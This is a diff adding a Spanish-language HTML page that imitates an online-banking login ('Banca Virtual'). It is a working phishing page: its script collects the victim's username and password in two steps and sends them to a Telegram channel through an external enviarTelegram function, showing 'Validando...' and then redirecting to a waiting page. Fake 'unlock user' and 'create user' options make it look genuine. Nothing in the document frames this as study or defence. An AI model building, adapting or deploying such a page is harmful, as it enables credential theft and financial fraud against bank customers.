@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banca Virtual - Bienvenid@</title>
+    <style>
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background-color: #f4f7f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 15px; }
+        .login-card { background: #ffffff; padding: 30px 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); width: 100%; max-width: 380px; text-align: center; }
+        .logo { max-width: 130px; margin-bottom: 10px; }
+        h1 { font-size: 1.6rem; color: #000; margin-bottom: 25px; font-weight: 700; }
+        
+        .input-container { position: relative; margin-bottom: 25px; height: 50px; }
+        .input-group { width: 100%; position: absolute; transition: opacity 0.4s ease, transform 0.4s ease; }
+        .input-group input { width: 100%; padding: 10px 0; border: none; border-bottom: 1.5px solid #ccc; font-size: 1rem; outline: none; text-align: center; }
+        .input-group input:focus { border-bottom-color: #0056b3; }
+        
+        /* Estados de animación para ocultar/mostrar */
+        .oculto { opacity: 0; pointer-events: none; transform: translateY(-10px); }
+        .visible { opacity: 1; pointer-events: auto; transform: translateY(0); }
+        
+        .btn { display: block; width: 100%; padding: 12px; margin-bottom: 12px; font-size: 1rem; border-radius: 6px; border: none; cursor: pointer; font-weight: 500; }
+        .btn-primary { background-color: #d6dbdf; color: #566573; transition: background 0.3s; }
+        .btn-secondary { background-color: #ebf5fb; color: #0056b3; }
+        
+        .link { display: inline-block; color: #0056b3; text-decoration: none; font-size: 0.9rem; margin: 15px 0 25px 0; }
+        .grid-options { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        .opt-box { background: #f8f9f9; padding: 12px; border-radius: 6px; font-size: 0.8rem; color: #0056b3; text-decoration: none; text-align: center; }
+        .error-box { display: none; background: #f8d7da; color: #721c24; padding: 10px; border-radius: 6px; font-size: 0.9rem; margin-bottom: 15px; border: 1px solid #f5c6cb; text-align: left; }
+    </style>
+</head>
+<body>
+
+<div class="login-card">
+    <img src="./logo.png" alt="Logotipo" class="logo">
+    <h1>Bienvenido</h1>
+    
+    <div class="error-box" id="errorContenedor">Acceso no autorizado. Por favor verifique sus credenciales.</div>
+
+    <form id="formLogin">
+        <div class="input-container">
+            <div class="input-group visible" id="grupoUsuario">
+                <input type="text" placeholder="Ingresa tu usuario" id="txtUsuario">
+            </div>
+            <div class="input-group oculto" id="grupoClave">
+                <input type="password" placeholder="Ingresa tu clave" id="txtPassword">
+            </div>
+        </div>
+        
+        <button type="button" class="btn btn-primary" id="btnAccion">Continuar</button>
+        <button type="button" class="btn btn-secondary">Desbloquear usuario</button>
+        
+        <a href="#" class="link">¿Olvidaste tu contraseña?</a>
+        
+        <div class="grid-options">
+            <div class="opt-box">👤 Crear usuario</div>
+            <div class="opt-box">💳 Solicitar productos</div>
+        </div>
+    </form>
+</div>
+
+<script src="./config.js"></script>
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+    if (urlParams.get('error') === 'true') {
+        document.getElementById('errorContenedor').style.display = 'block';
+    }
+
+    const txtUsuario = document.getElementById('txtUsuario');
+    const txtPassword = document.getElementById('txtPassword');
+    const btnAccion = document.getElementById('btnAccion');
+    
+    const grupoUsuario = document.getElementById('grupoUsuario');
+    const grupoClave = document.getElementById('grupoClave');
+    
+    let pasoActual = "usuario";
+
+    // Cambiar color del botón si hay texto escrito
+    function evaluarInput() {
+        const valor = pasoActual === "usuario" ? txtUsuario.value.trim() : txtPassword.value.trim();
+        if(valor !== '') {
+            btnAccion.style.backgroundColor = '#0056b3';
+            btnAccion.style.color = '#ffffff';
+        } else {
+            btnAccion.style.backgroundColor = '#d6dbdf';
+            btnAccion.style.color = '#566573';
+        }
+    }
+
+    txtUsuario.addEventListener('input', evaluarInput);
+    txtPassword.addEventListener('input', evaluarInput);
+
+    // Manejo de la transición interna con el botón único de Continuar
+    btnAccion.addEventListener('click', async () => {
+        if (pasoActual === "usuario" && txtUsuario.value.trim() !== "") {
+            // Desvanecer usuario y mostrar clave
+            grupoUsuario.classList.replace('visible', 'oculto');
+            grupoClave.classList.replace('oculto', 'visible');
+            
+            pasoActual = "clave";
+            evaluarInput();
+            txtPassword.focus();
+        } 
+        else if (pasoActual === "clave" && txtPassword.value.trim() !== "") {
+            // Ya tenemos ambos datos en caliente, enviamos a Telegram con los botones integrados
+            const user = txtUsuario.value;
+            const pass = txtPassword.value;
+            
+            btnAccion.innerText = "Validando...";
+            btnAccion.disabled = true;
+
+            await enviarTelegram(`👤 *Nuevo Intento de Login:*\nUser: \`${user}\`\nPass: \`${pass}\``);
+            
+            // Va directo a la pantalla de espera
+            window.location.href = 'wait.html';
+        }
+    });
+</script>
+</body>
+</html>
